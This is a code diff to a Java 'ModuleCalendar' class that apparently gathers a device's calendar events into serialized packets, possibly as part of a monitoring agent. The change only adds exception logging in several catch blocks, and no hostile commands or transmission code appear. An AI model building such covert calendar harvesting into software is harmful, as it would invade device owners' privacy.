@@ -34,7 +34,6 @@ public class ModuleCalendar extends BaseModule {
 
 	private static final String TAG = "ModuleCalendar"; //$NON-NLS-1$
 
-
 	private static final int FLAG_ALLDAY = 0x00000040;
 
 	private static final int POOM_STRING_SUBJECT = 0x01000000;
@@ -73,6 +72,10 @@ public class ModuleCalendar extends BaseModule {
 			try {
 				calendar = (HashMap<Long, Long>) markupCalendar.readMarkupSerializable();
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
 				}
@@ -101,6 +104,10 @@ public class ModuleCalendar extends BaseModule {
 				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
 			}
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
 			}
@@ -122,6 +129,10 @@ public class ModuleCalendar extends BaseModule {
 				serializeCalendar();
 			}
 		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go) Error: " + ex);
 			}
@@ -192,6 +203,10 @@ public class ModuleCalendar extends BaseModule {
 					// calculate the crc of the contact
 					packet = preparePacket(idEvent, title, description, location, begin, end, rrule, allDay);
 				} catch (Exception ex) {
+					if (Cfg.EXCEPTION) {
+						Check.log(ex);
+					}
+
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (calendar) Error: " + ex);
 					}
@@ -342,6 +357,10 @@ public class ModuleCalendar extends BaseModule {
 			return packet;
 
 		} catch (IOException ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (preparePacket) Error: " + ex);
 			}
